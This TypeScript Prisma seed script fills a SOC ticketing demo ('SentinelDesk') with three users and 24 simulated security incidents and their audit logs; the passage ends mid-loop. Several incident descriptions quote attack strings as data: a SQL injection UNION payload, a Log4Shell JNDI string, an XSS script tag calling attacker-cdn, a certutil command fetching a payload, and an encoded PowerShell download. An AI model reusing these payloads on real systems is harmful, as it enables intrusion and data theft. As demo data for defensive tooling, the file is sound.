import { PrismaClient, Role, Priority, Status } from '@prisma/client';
import bcrypt from 'bcryptjs';

const prisma = new PrismaClient();

// Helper para calcular fechas pasadas realistas (días, horas, minutos atrás)
function getPastDate(daysAgo: number, hoursAgo = 0, minutesAgo = 0): Date {
  const now = new Date();
  const past = new Date(now.getTime());
  past.setDate(past.getDate() - daysAgo);
  past.setHours(past.getHours() - hoursAgo);
  past.setMinutes(past.getMinutes() - minutesAgo);
  return past;
}

async function main() {
  console.log('===========================================================');
  console.log('🛡️  SENTINELDESK - SOC TIER 1/2 DATABASE SEEDER');
  console.log('===========================================================');
  console.log('Iniciando poblamiento de incidentes de ciberseguridad corporativos...\n');

  // 1. Limpieza de incidentes y logs previos para garantizar consistencia y evitar duplicados
  console.log('🧹 Limpiando registros antiguos de incidentes y logs de auditoría...');
  await prisma.auditLog.deleteMany();
  await prisma.incident.deleteMany();
  console.log('✔ Auditoría e incidentes anteriores limpiados.\n');

  // 2. Identificar o crear Usuario Administrador
  console.log('👤 Verificando usuario Administrador...');
  let admin = await prisma.user.findFirst({
    where: { role: Role.ADMIN },
  });

  if (!admin) {
    console.log('➕ Creando usuario Administrador principal...');
    const hashedAdminPassword = await bcrypt.hash('AdminPass2026!', 10);
    admin = await prisma.user.create({
      data: {
        name: 'Matias Administrador',
        email: 'admin@sentineldesk.com',
        password: hashedAdminPassword,
        role: Role.ADMIN,
      },
    });
    console.log(`✔ Usuario Administrador creado: ${admin.email}`);
  } else {
    console.log(`✔ Usuario Administrador identificado: ${admin.email} (ID: ${admin.id})`);
  }

  // 3. Identificar o crear Usuario Analista SOC (Rol: TECH)
  console.log('👤 Verificando usuario Analista SOC (TECH)...');
  let techUser = await prisma.user.findUnique({
    where: { email: 'analista.soc@sentineldesk.com' },
  });

  if (!techUser) {
    console.log('➕ Creando usuario Analista SOC L2 (TECH)...');
    const hashedTechPassword = await bcrypt.hash('SocAnalyst2026!', 10);
    techUser = await prisma.user.create({
      data: {
        name: 'Elena Ramos (SOC Analyst L2)',
        email: 'analista.soc@sentineldesk.com',
        password: hashedTechPassword,
        role: Role.TECH,
      },
    });
    console.log(`✔ Analista SOC creado: ${techUser.email} (Contraseña: SocAnalyst2026!)`);
  } else {
    console.log(`✔ Analista SOC identificado: ${techUser.email} (ID: ${techUser.id})`);
  }

  // 4. Identificar o crear Usuario Operador / Empleado (Rol: USER)
  console.log('👤 Verificando usuario Operador Corporativo (USER)...');
  let corporateUser = await prisma.user.findUnique({
    where: { email: 'carlos@empresa.com' },
  });

  if (!corporateUser) {
    console.log('➕ Creando usuario Operador corporativo...');
    const hashedUserPassword = await bcrypt.hash('UserPass2026!', 10);
    corporateUser = await prisma.user.create({
      data: {
        name: 'Carlos Empleado',
        email: 'carlos@empresa.com',
        password: hashedUserPassword,
        role: Role.USER,
      },
    });
    console.log(`✔ Usuario Operador creado: ${corporateUser.email}`);
  } else {
    console.log(`✔ Usuario Operador identificado: ${corporateUser.email} (ID: ${corporateUser.id})`);
  }

  console.log('\n--- Insertando Catálogo de Incidentes de Ciberseguridad (24 casos) ---\n');

  // Definición de incidentes técnicos realistas de SOC TIER 1 / TIER 2
  const incidentDefinitions = [
    // 1. CRITICAL - IN_PROGRESS
    {
      title: 'Ataque de fuerza bruta SSH distribuido contra Bastion Host',
      description: 'Se registraron más de 5,200 intentos fallidos de autenticación SSH en 12 minutos contra el bastion host perimetral srv-bastion-prod.corp (10.0.1.15:22). El ataque utilizó diccionarios de credenciales comunes (root, admin, deploy, ubuntu) originado desde un cluster botnet de 14 IPs públicas. Fail2ban aplicó un jail provisional. Requiere auditoría de llaves authorized_keys y restricción por Security Group.',
      priority: Priority.CRITICAL,
      status: Status.IN_PROGRESS,
      daysAgo: 2,
      hoursAgo: 6,
      author: admin,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'SIEM_ALERT_SSH_BRUTE_FORCE',
          ipAddress: '185.220.101.5',
          details: 'Detección de umbral superado: 5,241 intentos fallidos en srv-bastion-prod (10.0.1.15). Trigger: Rule ID SEC-SSH-402.',
          daysAgo: 2,
          hoursAgo: 6,
          user: admin,
        },
        {
          action: 'INCIDENT_TRIAGED_BY_TECH',
          ipAddress: '10.0.10.45',
          details: 'Analista L2 asignado al incidente. Bloqueo de subred atacante en Palo Alto Firewall y verificación de integridad de sshd_config.',
          daysAgo: 2,
          hoursAgo: 5,
          user: techUser,
        },
      ],
    },

    // 2. HIGH - OPEN
    {
      title: 'Alerta EDR: Invocación de PowerShell ofuscado con descarga en memoria (T1059.001)',
      description: 'CrowdStrike Falcon generó alerta de severidad alta en la estación WS-FINANCE-04 (10.0.4.88). Se detectó el proceso WINWORD.EXE (PID: 4892) invocando una instancia oculta de powershell.exe -NoP -NonI -W Hidden -Enc JABjAGwAaQBlAG4AdAA... El script intentó descargar un payload secundario desde http://91.240.118.77/stage2.bin. La conexión fue bloqueada pero el host requiere aislamiento y análisis forense.',
      priority: Priority.HIGH,
      status: Status.OPEN,
      daysAgo: 1,
      hoursAgo: 4,
      author: corporateUser,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'EDR_SUSPICIOUS_EXECUTION_BLOCKED',
          ipAddress: '10.0.4.88',
          details: 'CrowdStrike Falcon Alert CS-9912: WINWORD.EXE -> powershell.exe ofuscado en base64. Conexión saliente a 91.240.118.77 neutralizada en endpoint.',
          daysAgo: 1,
          hoursAgo: 4,
          user: corporateUser,
        },
      ],
    },

    // 3. CRITICAL - IN_PROGRESS
    {
      title: 'Detección de Beaconing C2 hacia infraestructura Cobalt Strike (T1071.001)',
      description: 'El motor de análisis de tráfico Zeek/Suricata identificó un patrón recurrente de balizamiento HTTP persistente con jitter del 12% y frecuencia de 60 segundos hacia la IP externa 193.142.146.88:8443 desde el servidor srv-app-billing-01 (10.0.2.14). Cabeceras HTTP coinciden con perfiles maleables de Cobalt Strike 4.9. Interfaz de red desconectada preventivamente para contención.',
      priority: Priority.CRITICAL,
      status: Status.IN_PROGRESS,
      daysAgo: 3,
      hoursAgo: 10,
      author: admin,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'NETWORK_ANOMALY_C2_BEACONING',
          ipAddress: '193.142.146.88',
          details: 'Suricata SID 2028391: Detección de Cobalt Strike Beacon HTTP Malleable Profile. Host interno comprometido: 10.0.2.14.',
          daysAgo: 3,
          hoursAgo: 10,
          user: admin,
        },
        {
          action: 'CONTAINMENT_HOST_ISOLATED',
          ipAddress: '10.0.10.45',
          details: 'Servidor 10.0.2.14 aislado a nivel de conmutador virtual en Quarantine VLAN. Volcado de memoria RAM programado para volcado forense con LiME.',
          daysAgo: 3,
          hoursAgo: 9,
          user: techUser,
        },
      ],
    },

    // 4. MEDIUM - RESOLVED
    {
      title: 'Intentos masivos de SQL Injection bloqueados en Cloudflare WAF',
      description: 'El WAF corporativo interceptó y descartó 842 peticiones HTTP POST dirigidas a /api/v1/customer/orders/query. Los payloads contenían secuencias de inyección SQL como UNION SELECT NULL, username, password_hash FROM admin_users-- provenientes de la IP atacante 45.134.225.18. Se validó que las consultas de la aplicación utilizan consultas parametrizadas con ORM sin riesgo de ejecución.',
      priority: Priority.MEDIUM,
      status: Status.RESOLVED,
      daysAgo: 7,
      hoursAgo: 12,
      author: admin,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'WAF_SQLI_ATTACK_MITIGATED',
          ipAddress: '45.134.225.18',
          details: 'Regla WAF OWASP CRS 942100 (SQLi Detected) bloqueó 842 peticiones consecutivas con código HTTP 403 Forbidden.',
          daysAgo: 7,
          hoursAgo: 12,
          user: admin,
        },
        {
          action: 'INCIDENT_CLOSED_AND_REMEDIATED',
          ipAddress: '10.0.10.45',
          details: 'Verificado con equipo de desarrollo: las consultas del backend usan Prepared Statements (Prisma ORM). Sin impacto en datos. IP agregada a blocklist por 30 días.',
          daysAgo: 7,
          hoursAgo: 8,
          user: techUser,
        },
      ],
    },

    // 5. HIGH - IN_PROGRESS
    {
      title: 'Campaña de Phishing de Credenciales dirigida a Recursos Humanos',
      description: 'El gateway de correo Proofpoint alertó sobre la recepción de 18 correos maliciosos simulando actualización obligatoria de nómina con link a hxxps://login-microsoftonline-update[.]live. 2 colaboradores ingresaron sus credenciales antes del bloqueo del dominio. Se activó el protocolo de revocación de sesiones en Azure AD y forzado de MFA.',
      priority: Priority.HIGH,
      status: Status.IN_PROGRESS,
      daysAgo: 4,
      hoursAgo: 8,
      author: corporateUser,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'PHISHING_EMAIL_REPORTED',
          ipAddress: '198.51.100.42',
          details: 'Usuario carlos@empresa.com reportó correo sospechoso. PhishAlarm confirmó dominio malicioso de recolección de credenciales.',
          daysAgo: 4,
          hoursAgo: 8,
          user: corporateUser,
        },
        {
          action: 'REMEDIATION_USER_SESSIONS_REVOKED',
          ipAddress: '10.0.10.45',
          details: 'Revocación inmediata de tokens OAuth y reset de contraseñas de las cuentas comprometidas en Microsoft Entra ID.',
          daysAgo: 4,
          hoursAgo: 7,
          user: techUser,
        },
      ],
    },

    // 6. LOW - RESOLVED
    {
      title: 'Escaneo masivo de puertos TCP y Banner Grabbing Nmap desde host externo',
      description: 'El firewall perimetral Palo Alto Networks registró un barrido exhaustivo de puertos TCP SYN (nmap -sS -Pn -p 1-65535) contra la subred DMZ pública 200.89.155.0/28 desde la IP 194.26.29.112. Todos los puertos no publicados respondieron con TCP RST/DROP. No se detectaron servicios vulnerables expuestos.',
      priority: Priority.LOW,
      status: Status.RESOLVED,
      daysAgo: 14,
      hoursAgo: 16,
      author: admin,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'FIREWALL_RECON_PORT_SCAN_BLOCKED',
          ipAddress: '194.26.29.112',
          details: 'Palo Alto Threat ID 80001 (TCP SYN Port Sweep). 64,500 paquetes descartados automáticamente por política perimetral.',
          daysAgo: 14,
          hoursAgo: 16,
          user: admin,
        },
        {
          action: 'INCIDENT_RESOLVED',
          ipAddress: '10.0.10.45',
          details: 'Cierre rutinario de ticket de escaneo perimetral. Superficie de ataque DMZ verificada sin anomalías.',
          daysAgo: 14,
          hoursAgo: 14,
          user: techUser,
        },
      ],
    },

    // 7. CRITICAL - OPEN
    {
      title: 'Alerta de Escalada Indebida de Privilegios en Active Directory (CVE-2024-49113)',
      description: 'El SIEM Splunk correlacionó múltiples eventos del registro de seguridad de Windows en el Controlador de Dominio principal DC01.corp (10.0.0.10). Se detectó la generación de un ticket Kerberos TGS con privilegios de Domain Admin solicitado por la cuenta de servicio de respaldo svc_backup_sql. Se sospecha explotación de vulnerabilidad Kerberos privilege escalation.',
      priority: Priority.CRITICAL,
      status: Status.OPEN,
      daysAgo: 1,
      hoursAgo: 8,
      author: admin,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'SIEM_CORRELATION_PRIVILEGE_ESCALATION',
          ipAddress: '10.0.0.10',
          details: 'Event ID 4672/4769: Solicitud Kerberos con privilegios no autorizados (SeDebugPrivilege) por svc_backup_sql en DC01.',
          daysAgo: 1,
          hoursAgo: 8,
          user: admin,
        },
      ],
    },

    // 8. CRITICAL - RESOLVED
    {
      title: 'Alerta de Ransomware: Modificación de archivo trampa Canary en File Server',
      description: 'El sistema de detección temprana de ransomware alertó sobre la modificación y cifrado del archivo canary oculto .canary_lockbit.docx en \\fileserver-shared-02\\data\\. El proceso anómalo rundll32.exe (PID: 3218) en la estación 10.0.5.33 intentó propagar el cifrado. El agente EDR liquidó el árbol de procesos y aisló el endpoint en 4 segundos.',
      priority: Priority.CRITICAL,
      status: Status.RESOLVED,
      daysAgo: 10,
      hoursAgo: 18,
      author: admin,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'RANSOMWARE_CANARY_TRIGGERED',
          ipAddress: '10.0.5.33',
          details: 'Alerta EDR-RANSOM-004: Modificación del señuelo detectada. Hash SHA256 sospechoso: a8f4e2c81... Host 10.0.5.33 en cuarentena.',
          daysAgo: 10,
          hoursAgo: 18,
          user: admin,
        },
        {
          action: 'INCIDENT_CONTAINED_AND_RESOLVED',
          ipAddress: '10.0.10.45',
          details: 'Estación de trabajo aislada y reinstalada desde imagen maestra. Sin datos de negocio comprometidos gracias a la rápida respuesta del EDR.',
          daysAgo: 10,
          hoursAgo: 12,
          user: techUser,
        },
      ],
    },

    // 9. HIGH - OPEN
    {
      title: 'Exfiltración de datos confidenciales mediante Túnel DNS (T1071.004)',
      description: 'Sensor de telemetría de red detectó un volumen inusual de más de 22,000 peticiones DNS tipo TXT y CNAME en 3 horas hacia subdominios aleatorios bajo *.data.ns-exfil[.]xyz. El tráfico se originó en la estación de desarrollo WS-DEV-19 (10.0.3.55). Se presume el uso de herramientas de tunneling DNS como dnscat2 para eludir controles perimetrales.',
      priority: Priority.HIGH,
      status: Status.OPEN,
      daysAgo: 2,
      hoursAgo: 3,
      author: admin,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'DNS_TUNNELING_EXFILTRATION_DETECTED',
          ipAddress: '10.0.3.55',
          details: 'Anomalía de entropía en consultas DNS (> 4.8 Shannon Entropy). Servidor NS malicioso 195.123.245.9 bloqueado en resolvers corporativos.',
          daysAgo: 2,
          hoursAgo: 3,
          user: admin,
        },
      ],
    },

    // 10. HIGH - RESOLVED
    {
      title: 'Ataque volumétrico de Denegación de Servicio TCP SYN Flood (DDoS L4)',
      description: 'Ataque DDoS distribuido con tasa máxima de 1.8 millones de paquetes por segundo (Mpps) dirigido contra la IP virtual (VIP) del balanceador F5 perimetral. Provocó saturación transitoria de la tabla de conexiones de estado. Se activaron los perfiles SYN Cookies y se coordinó mitigación con el proveedor upstream.',
      priority: Priority.HIGH,
      status: Status.RESOLVED,
      daysAgo: 18,
      hoursAgo: 20,
      author: admin,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'DDOS_SYN_FLOOD_THRESHOLD_EXCEEDED',
          ipAddress: '185.190.140.22',
          details: 'Ataque TCP SYN Flood superó 1.5 Mpps en puerto 443. Despliegue de reglas BGP FlowSpec iniciado con el ISP.',
          daysAgo: 18,
          hoursAgo: 20,
          user: admin,
        },
        {
          action: 'INCIDENT_RESOLVED',
          ipAddress: '10.0.10.45',
          details: 'Tráfico mitigado exitosamente por upstream DDoS scrubber. Tiempos de respuesta de la plataforma estabilizados en 35ms.',
          daysAgo: 18,
          hoursAgo: 17,
          user: techUser,
        },
      ],
    },

    // 11. MEDIUM - RESOLVED
    {
      title: 'Alerta de Viaje Imposible (Impossible Travel) en credenciales de Azure AD',
      description: 'Microsoft Entra ID Protection disparó alerta de alto riesgo por inicio de sesión anómalo. La cuenta carlos@empresa.com inició sesión exitosa en Buenos Aires, Argentina (IP: 181.44.12.8) y 28 minutos después registró otro acceso desde Frankfurt, Alemania (IP: 195.201.88.4). Se investigó posible compromiso de credenciales.',
      priority: Priority.MEDIUM,
      status: Status.RESOLVED,
      daysAgo: 9,
      hoursAgo: 14,
      author: corporateUser,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'ENTRA_ID_IMPOSSIBLE_TRAVEL_FLAGGED',
          ipAddress: '195.201.88.4',
          details: 'Alerta Identity Protection: Velocidad geográfica calculada >23,000 km/h. Sesión bloqueada preventivamente.',
          daysAgo: 9,
          hoursAgo: 14,
          user: corporateUser,
        },
        {
          action: 'INCIDENT_RESOLVED_VERIFIED',
          ipAddress: '10.0.10.45',
          details: 'Entrevista con el usuario confirmó que activó una extensión VPN comercial gratuita. Se ordenó desinstalación y se rotó la contraseña de acceso.',
          daysAgo: 9,
          hoursAgo: 11,
          user: techUser,
        },
      ],
    },

    // 12. CRITICAL - IN_PROGRESS
    {
      title: 'Extracción indebida de credenciales en memoria LSASS (MITRE T1003.001)',
      description: 'Sysmon Event ID 10 registró apertura de handle con permisos PROCESS_VM_READ contra el proceso del subsistema de seguridad local lsass.exe en la estación WS-LOGISTICS-02 (10.0.4.112). El binario ejecutor temp_updater.exe presentaba características típicas de Mimikatz / Dumpert. El agente EDR neutralizó el proceso.',
      priority: Priority.CRITICAL,
      status: Status.IN_PROGRESS,
      daysAgo: 2,
      hoursAgo: 12,
      author: admin,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'LSASS_MEMORY_DUMP_INTERCEPTED',
          ipAddress: '10.0.4.112',
          details: 'Alerta EDR-MEM-301: Intento de volcado de memoria de lsass.exe por proceso no firmado PID 5104. Hash: d41d8cd98f00b204e9800998ecf8427e.',
          daysAgo: 2,
          hoursAgo: 12,
          user: admin,
        },
        {
          action: 'INCIDENT_TRIAGED_BY_TECH',
          ipAddress: '10.0.10.45',
          details: 'Host 10.0.4.112 puesto en contención de red. Analista recolectando evidencia forense volátil con KAPE y triage de Sysmon.',
          daysAgo: 2,
          hoursAgo: 11,
          user: techUser,
        },
      ],
    },

    // 13. CRITICAL - IN_PROGRESS
    {
      title: 'Implantación de Web Shell en servidor expuesto (CVE-2023-34362 MOVEit Transfer)',
      description: 'El agente de monitoreo de integridad de archivos (Wazuh FIM) alertó sobre la creación extemporánea del archivo human2.aspx en /moveit/app/scripts/ en el servidor web srv-transfer-01 (10.0.1.20). Los logs de IIS registran peticiones POST continuas con código 200 y parámetros de comando. Se sospecha compromiso por actor de amenaza FIN11.',
      priority: Priority.CRITICAL,
      status: Status.IN_PROGRESS,
      daysAgo: 4,
      hoursAgo: 18,
      author: admin,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'WEBSHELL_FILE_CREATION_DETECTED',
          ipAddress: '10.0.1.20',
          details: 'Wazuh FIM Alert: Nuevo archivo ASPX no firmado creado en directorio web con atributos ocultos y funciones de eval() remoto.',
          daysAgo: 4,
          hoursAgo: 18,
          user: admin,
        },
        {
          action: 'CONTAINMENT_ACTIONS_INITIATED',
          ipAddress: '10.0.10.45',
          details: 'Servicio IIS detenido en srv-transfer-01. Muestra del archivo aislada para análisis estático y dinámico en sandbox Cuckoo.',
          daysAgo: 4,
          hoursAgo: 16,
          user: techUser,
        },
      ],
    },

    // 14. HIGH - RESOLVED
    {
      title: 'Uso no autorizado de Access Key de AWS IAM expuesta en repositorio público',
      description: 'AWS GuardDuty generó el hallazgo UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration. Una clave de acceso de desarrollo fue utilizada desde la IP externa 104.244.72.115 para listar buckets S3 e intentar aprovisionar instancias EC2 c5.24xlarge en la región ap-southeast-1. Se identificó fuga accidental en commit de GitHub.',
      priority: Priority.HIGH,
      status: Status.RESOLVED,
      daysAgo: 12,
      hoursAgo: 22,
      author: admin,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'AWS_GUARDDUTY_COMPROMISED_KEY',
          ipAddress: '104.244.72.115',
          details: 'GuardDuty Finding ID: gd-2026-90412. Actividad de API anómala: ec2:RunInstances en región inusual por credencial filtrada.',
          daysAgo: 12,
          hoursAgo: 22,
          user: admin,
        },
        {
          action: 'INCIDENT_CLOSED_AND_REMEDIATED',
          ipAddress: '10.0.10.45',
          details: 'Access Key eliminada de inmediato en IAM. Instancias no autorizadas terminadas. Implementado escaneo gitleaks en pipeline CI/CD.',
          daysAgo: 12,
          hoursAgo: 18,
          user: techUser,
        },
      ],
    },

    // 15. MEDIUM - OPEN
    {
      title: 'Ataque de Password Spraying horizontal contra portal SSO de Okta',
      description: 'El SIEM detectó un patrón de Password Spraying dirigido al endpoint /oauth2/v1/authorize. Durante un lapso de 6 horas se probaron 3 contraseñas estacionales predecibles (Primavera2026!, Sentinel2026*, Empresa123!) sobre 450 cuentas de empleados, espaciando 5 minutos entre intentos para evadir el umbral de bloqueo de cuenta.',
      priority: Priority.MEDIUM,
      status: Status.OPEN,
      daysAgo: 3,
      hoursAgo: 5,
      author: admin,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'PASSWORD_SPRAYING_ATTACK_DETECTED',
          ipAddress: '89.248.165.71',
          details: 'Correlación SIEM: 1,350 intentos fallidos de autenticación sobre 450 usuarios distintos desde una red de proxies residenciales.',
          daysAgo: 3,
          hoursAgo: 5,
          user: admin,
        },
      ],
    },

    // 16. HIGH - OPEN
    {
      title: 'Manipulación y borrado de registros de eventos de Windows (T1070.001)',
      description: 'El sensor de auditoría registró la emisión del Evento ID 1102 (The audit log was cleared) en el servidor de base de datos de nómina SRV-PAYROLL-01 (10.0.2.80). El comando ejecutado fue wevtutil cl Security ejecutado desde una sesión interactiva elevada. La acción busca ocultar rastros de accesos no autorizados.',
      priority: Priority.HIGH,
      status: Status.OPEN,
      daysAgo: 2,
      hoursAgo: 7,
      author: admin,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'SECURITY_LOG_CLEARED_ALERT',
          ipAddress: '10.0.2.80',
          details: 'Windows Event 1102: Registro de seguridad borrado manualmente mediante wevtutil por cuenta local Administrador.',
          daysAgo: 2,
          hoursAgo: 7,
          user: admin,
        },
      ],
    },

    // 17. MEDIUM - IN_PROGRESS
    {
      title: 'Detección de troyano Infostealer (LummaC2) en estación de Marketing',
      description: 'El antivirus del endpoint bloqueó la ejecución de setup_adobe_crack.exe en la estación WS-MKT-07 (10.0.4.52). El binario intentó acceder a los almacenes de contraseñas de Google Chrome y tokens de sesión de Discord y Telegram. Se observaron conexiones bloqueadas hacia el dominio de control lumma-c2-gate[.]biz.',
      priority: Priority.MEDIUM,
      status: Status.IN_PROGRESS,
      daysAgo: 5,
      hoursAgo: 15,
      author: corporateUser,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'MALWARE_INFOSTEALER_BLOCKED',
          ipAddress: '10.0.4.52',
          details: 'Detección EDR: Trojan:Win32/LummaStealer.MK!MTB en Downloads. Intentos de acceso a archivos de cookies cancelados.',
          daysAgo: 5,
          hoursAgo: 15,
          user: corporateUser,
        },
        {
          action: 'INCIDENT_TRIAGED_BY_TECH',
          ipAddress: '10.0.10.45',
          details: 'Estación apartada a la red de cuarentena. Analizando persistencia en llaves Run del registro y tareas programadas de Windows.',
          daysAgo: 5,
          hoursAgo: 13,
          user: techUser,
        },
      ],
    },

    // 18. LOW - RESOLVED
    {
      title: 'Intento de explotación de vulnerabilidad Log4Shell (CVE-2021-44228)',
      description: 'El WAF perimetral registró peticiones HTTP con cadenas inyectadas ${jndi:ldap://log4j-scan.cyberresearch-io[.]com/exec} en los encabezados User-Agent y X-Api-Version. Se evaluaron los microservicios backend y se comprobó que operan sobre Node.js y Spring Boot con versiones inmunes sin log4j-core vulnerable.',
      priority: Priority.LOW,
      status: Status.RESOLVED,
      daysAgo: 21,
      hoursAgo: 19,
      author: admin,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'WAF_LOG4SHELL_EXPLOIT_BLOCKED',
          ipAddress: '192.241.220.14',
          details: 'Regla WAF 944130 (Log4j Remote Code Execution Attempt). Petición HTTP rechazada con código 403.',
          daysAgo: 21,
          hoursAgo: 19,
          user: admin,
        },
        {
          action: 'INCIDENT_RESOLVED',
          ipAddress: '10.0.10.45',
          details: 'Revisión de arquitectura completada. Aplicaciones sin dependencias afectadas por CVE-2021-44228. Falso impacto.',
          daysAgo: 21,
          hoursAgo: 16,
          user: techUser,
        },
      ],
    },

    // 19. MEDIUM - RESOLVED
    {
      title: 'Creación no autorizada de usuario local con privilegios sudo en servidor Linux',
      description: 'El servicio auditd en srv-db-replica-02 (10.0.1.45) registró el comando useradd -m -s /bin/bash sys_ops_temp y la adición del archivo /etc/sudoers.d/sys_ops_temp con privilegios totales sin password. La acción se realizó fuera de ventana de mantenimiento y sin ticket RFC.',
      priority: Priority.MEDIUM,
      status: Status.RESOLVED,
      daysAgo: 11,
      hoursAgo: 9,
      author: admin,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'AUDITD_UNAUTHORIZED_USER_CREATED',
          ipAddress: '10.0.1.45',
          details: 'Auditd syscall execve: useradd sys_ops_temp ejecutado con UID=0 (root).',
          daysAgo: 11,
          hoursAgo: 9,
          user: admin,
        },
        {
          action: 'INCIDENT_CLOSED_AND_REMEDIATED',
          ipAddress: '10.0.10.45',
          details: 'Aclarado con el equipo DevOps: contingencia técnica de fin de semana no formalizada. Usuario eliminado y registrado RFC retroactivo.',
          daysAgo: 11,
          hoursAgo: 6,
          user: techUser,
        },
      ],
    },

    // 20. LOW - RESOLVED
    {
      title: 'Intento de Stored Cross-Site Scripting (XSS) en módulo de tickets',
      description: 'Durante la auditoría de peticiones web se interceptó un envío en el que el campo de comentarios contenía: <script src="https://attacker-cdn[.]xyz/payload.js"></script><img src=x onerror=alert(document.cookie)>. La capa de sanitización DOMPurify neutralizó las etiquetas HTML antes de guardar en la base de datos.',
      priority: Priority.LOW,
      status: Status.RESOLVED,
      daysAgo: 16,
      hoursAgo: 11,
      author: corporateUser,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'WEB_XSS_ATTACK_SANITIZED',
          ipAddress: '201.218.44.90',
          details: 'Filtro anti-XSS activado en backend. Carga maliciosa codificada a texto plano sin ejecución de scripts.',
          daysAgo: 16,
          hoursAgo: 11,
          user: corporateUser,
        },
        {
          action: 'INCIDENT_RESOLVED',
          ipAddress: '10.0.10.45',
          details: 'Validado que el frontend escapa los caracteres peligrosos por defecto en el renderizado de React.',
          daysAgo: 16,
          hoursAgo: 9,
          user: techUser,
        },
      ],
    },

    // 21. MEDIUM - OPEN
    {
      title: 'Conexión VPN en horario nocturno anómalo con múltiples sesiones RDP internas',
      description: 'El concentrador VPN Fortinet registró un inicio de sesión exitoso en domingo a las 03:45 AM perteneciente al consultor externo ext.proveedor_it. Inmediatamente el host inició sesiones consecutivas por puerto TCP 3389 (RDP) hacia tres servidores de staging internos (10.0.6.10, 10.0.6.11, 10.0.6.12).',
      priority: Priority.MEDIUM,
      status: Status.OPEN,
      daysAgo: 1,
      hoursAgo: 1,
      author: admin,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'VPN_ANOMALOUS_OFFHOURS_LOGIN',
          ipAddress: '186.138.201.77',
          details: 'FortiGate SSL-VPN: Usuario ext.proveedor_it conectado fuera de ventana laboral autorizada (03:45 UTC).',
          daysAgo: 1,
          hoursAgo: 1,
          user: admin,
        },
      ],
    },

    // 22. LOW - OPEN
    {
      title: 'Detección de ataque ARP Spoofing / Man-In-The-Middle en segmento de oficina',
      description: 'El switch Cisco Catalyst 9300 generó alerta de Dynamic ARP Inspection (DAI). La dirección MAC 00:1A:2B:3C:4D:5E envió paquetes ARP reply gratuitos anunciándose a sí misma como el gateway predeterminado 10.0.3.1 hacia otros 15 equipos. El puerto fue colocado en estado err-disable por port-security.',
      priority: Priority.LOW,
      status: Status.OPEN,
      daysAgo: 3,
      hoursAgo: 7,
      author: admin,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'NETWORK_DAI_ARP_SPOOFING_DROPPED',
          ipAddress: '10.0.3.140',
          details: 'Cisco DAI violation: Interfaz GigabitEthernet1/0/24 deshabilitada. Posible uso de suite arpspoof/bettercap.',
          daysAgo: 3,
          hoursAgo: 7,
          user: admin,
        },
      ],
    },

    // 23. HIGH - RESOLVED
    {
      title: 'Ataque de Fatiga de Autenticación Multifactor (MFA Prompt Bombing)',
      description: 'Un atacante con la contraseña del Director de Finanzas disparó 54 solicitudes de autenticación push consecutivas en 10 minutos a través de Microsoft Authenticator, buscando aceptación involuntaria. El directivo rechazó todas las peticiones y avisó al SOC. Se bloqueó la cuenta y se exigió cambio presencial.',
      priority: Priority.HIGH,
      status: Status.RESOLVED,
      daysAgo: 8,
      hoursAgo: 17,
      author: corporateUser,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'MFA_FATIGUE_ATTACK_DETECTED',
          ipAddress: '94.102.61.12',
          details: '54 solicitudes push emitidas en ráfaga. Azure AD Smart Lockout activado tras rechazos reiterados.',
          daysAgo: 8,
          hoursAgo: 17,
          user: corporateUser,
        },
        {
          action: 'INCIDENT_CLOSED_AND_REMEDIATED',
          ipAddress: '10.0.10.45',
          details: 'Se habilitó Number Matching obligatorio en las directivas de acceso condicional de MFA para toda la organización.',
          daysAgo: 8,
          hoursAgo: 14,
          user: techUser,
        },
      ],
    },

    // 24. LOW - OPEN
    {
      title: 'Detección de técnica Living-off-the-Land (LOLBAS) mediante CertUtil.exe',
      description: 'El sensor EDR detectó la ejecución del binario legítimo C:\\Windows\\System32\\certutil.exe con los argumentos -urlcache -split -f https://pastebin[.]com/raw/k9X12bc payload.dll. La política de AppLocker impidió la descarga y la escritura del archivo en disco.',
      priority: Priority.LOW,
      status: Status.OPEN,
      daysAgo: 4,
      hoursAgo: 2,
      author: admin,
      assignedTo: techUser,
      auditLogs: [
        {
          action: 'EDR_LOLBAS_CERTUTIL_DOWNLOAD_BLOCKED',
          ipAddress: '10.0.4.15',
          details: 'Alerta EDR T1105 (Ingress Tool Transfer): certutil.exe invocado con flag -urlcache. Conexión a pastebin bloqueada.',
          daysAgo: 4,
          hoursAgo: 2,
          user: admin,
        },
      ],
    },
  ];

  // Inserción secuencial para asegurar la integridad referencial y marcas de tiempo
  let createdIncidentsCount = 0;
  let createdAuditLogsCount = 0;

  for (const item of incidentDefinitions) {
    const incidentCreatedAt = getPastDate(item.daysAgo, item.hoursAgo);

    const createdIncident = await prisma.incident.create({
      data: {
        title: item.title,
        description: item.description,
        priority: item.priority,
        status: item.status,
        authorId: item.author.id,
        assignedToId: item.assignedTo ? item.assignedTo.id : null,
        createdAt: incidentCreatedAt,
        updatedAt: incidentCreatedAt,
      },
    });

    createdIncidentsCount++;

    // Inserción de logs de auditoría para cada incidente
    for (const logItem of item.auditLogs) {
      const logCreatedAt = getPastDate(logItem.daysAgo, logItem.hoursAgo);

      await prisma.auditLog.create({
        data: {
          action: logItem.action,
          ipAddress: logItem.ipAddress,
          details: logItem.details,
          userId: logItem.user ? logItem.user.id : null,
          incidentId: createdIncident.id,
          createdAt: logCreatedAt,
        },
      });

      createdAuditLogsCount++;
    }

